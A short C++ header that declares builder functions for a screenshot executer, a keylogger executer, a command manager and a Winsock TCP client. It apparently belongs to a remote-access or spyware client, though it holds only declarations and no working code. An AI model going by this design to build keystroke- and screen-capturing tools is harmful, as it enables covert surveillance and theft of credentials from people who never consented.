#pragma once

#include "command/execute/ScreenshotExecuter.h"
#include "command/execute/KeyloggerExecuter.h"
#include "command/CommandManager.h"
#include "networking/WinsockTCPClient.h"


namespace utils
{
/**
  * This namespace contains object building utilities.
  */
namespace builders
{
    command::ICommandExecuter* BuildScreenshotExecuter();

    command::ICommandExecuter* BuildKeyloggerExecuter();

    command::CommandManager* BuildManager();

    networking::WinsockTCPClient* BuildClient();
}
}
